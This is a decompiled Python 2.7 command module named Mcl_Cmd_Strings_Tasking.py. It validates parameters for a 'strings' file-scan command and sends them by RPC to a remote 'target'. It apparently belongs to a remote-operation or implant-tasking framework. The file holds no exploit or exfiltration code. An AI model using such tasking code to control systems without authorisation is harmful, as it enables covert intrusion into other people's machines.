# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Strings_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.virtualdir
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.strings', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.strings.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['filename'] != None:
        filename = lpParams['filename']
    else:
        filename = ''
    try:
        filename = mcl.tasking.virtualdir.GetFullPath(filename)
    except:
        mcl.tasking.EchoError('Failed to apply virtual dir')
        return False

    tgtParams = mca.file.cmd.strings.Params()
    tgtParams.file = filename
    tgtParams.threshold = lpParams['threshold']
    tgtParams.maximum = lpParams['maximum']
    tgtParams.encoding = lpParams['encoding']
    tgtParams.start = lpParams['startOffset']
    tgtParams.end = lpParams['endOffset']
    if tgtParams.threshold < mca.file.cmd.strings.PARAMS_MIN_THRESHOLD:
        mcl.tasking.EchoError('Given threshold below minimum (%u)' % mca.file.cmd.strings.PARAMS_MIN_THRESHOLD)
        return False
    else:
        if tgtParams.start >= tgtParams.end and tgtParams.start != 0 and tgtParams.end != 0:
            mcl.tasking.EchoError('Invalid start or end offset(s)')
            return False
        taskXml = mcl.tasking.Tasking()
        taskXml.AddSearchPath(tgtParams.file)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        rpc = mca.file.cmd.strings.tasking.RPC_INFO_STRINGS
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.file.cmd.strings.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)